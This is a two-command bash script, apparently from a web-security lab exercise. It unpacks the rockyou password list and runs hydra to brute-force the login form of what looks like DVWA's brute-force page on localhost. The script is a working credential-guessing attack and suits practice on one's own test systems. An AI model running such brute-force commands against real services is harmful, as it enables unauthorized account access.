#!/bin/bash

sudo gzip -d /usr/share/wordlists/rockyou.txt.gz

hydra -L users.txt -P /usr/share/wordlists/rockyou.txt 127.0.0.1 http-post-form "/vulnerabilities/brute/:username=^USER^:password=^PASS^:Login=Login#" -V

